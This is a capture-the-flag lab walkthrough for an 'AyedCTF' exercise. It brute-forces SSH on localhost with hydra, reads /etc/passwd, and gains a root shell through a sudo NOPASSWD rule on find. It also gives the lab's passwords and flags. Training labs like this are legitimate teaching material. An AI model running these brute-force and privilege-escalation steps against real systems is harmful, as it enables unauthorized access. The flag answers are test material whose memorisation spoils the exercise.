# ✅ AyedCTF — Hydra Lab Solution

This is the official walkthrough for the **Hydra SSH Brute-Force Lab**.

---

## 🔎 Step 1 — Enumerate Local Users

First list users with home directories:

```bash
cat /etc/passwd | grep /home
````

Expected output:

```
kali:x:1000:1000:/home/kali:/bin/bash
victim:x:1001:1001:/home/victim:/bin/bash
```

🎯 **Target user = victim**

---

## 🚀 Step 2 — Brute-force SSH Using Hydra

Use the provided wordlist:

```bash
hydra -l victim -P pass.txt ssh://localhost -t 4 -vV
```

Expected success line:

```
[22][ssh] host: localhost   login: victim   password: coffee123
```

🎉 **Password found:** `coffee123`

---

## 🔐 Step 3 — Access SSH

Use the cracked password:

```bash
ssh victim@localhost
```

Login successful.

---

## 🏁 Step 4 — Capture User Flag

Inside the victim home directory:

```bash
ls -la
cat user.txt
```

Flag:

```
ayedCTF{ssh_bruteforce_success}
```

---

## ⬆️ Step 5 — Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

Expected:

```
(ALL) NOPASSWD: /usr/bin/find
```

This is an intentional vulnerability.

### Exploit it:

```bash
sudo find . -exec /bin/bash \;
```

Now you have a **root shell**.

Confirm:

```bash
whoami
```

Expected:

```
root
```

---

## 🔥 Step 6 — Capture Root Flag

```bash
cat /root/root.txt
```

Flag:

```
ayedCTF{root_privesc_master}
```

